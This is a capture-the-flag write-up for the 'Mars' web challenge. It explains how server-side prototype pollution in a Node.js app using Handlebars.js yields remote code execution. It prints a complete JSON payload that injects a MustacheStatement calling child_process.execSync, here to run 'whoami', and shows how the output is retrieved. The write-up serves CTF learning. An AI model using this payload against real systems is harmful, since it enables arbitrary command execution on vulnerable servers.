# Writeup: Mars (Server-Side Prototype Pollution → Remote Code Execution)

## **Challenge Overview**
The challenge **Mars** was hosted on `http://web-ctf.cyberspace.ma:5701`. By analyzing the target, we determined that the challenge involved a **Node.js** application that used **Handlebars.js** as a templating engine. Given the presence of **Prototype Pollution**, we exploited it to achieve **Remote Code Execution (RCE)**.

---

## **Understanding the Vulnerability**
The attack vector involved **Prototype Pollution** in JavaScript. This occurs when an attacker can modify the `__proto__` property of an object, thereby injecting malicious behavior into the application's execution flow. 

In this case, we could modify the `__proto__` property to inject **MustacheStatements**, allowing us to execute arbitrary code in Handlebars.js.

---

## **Exploitation Process**
### **1. Sending the Prototype Pollution Payload**
We sent a `POST` request to the `/api/submit` endpoint, including the following JSON payload:

```json
{
    "artist.name": "Mars",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
}
```

#### **What happens here?**
- We modify the `__proto__` property to **inject a new statement into the Handlebars.js template rendering engine**.
- The injected **MustacheStatement** executes JavaScript code, allowing us to run:
  ```js
  process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)
  ```
- This command writes the output of `whoami` (the current user running the application) into the `/app/static/out` file.

### **2. Retrieving the Command Output**
After injecting our payload, we made a `GET` request to retrieve the output:

```python
print(requests.get(TARGET_URL+'/static/out').text)
```
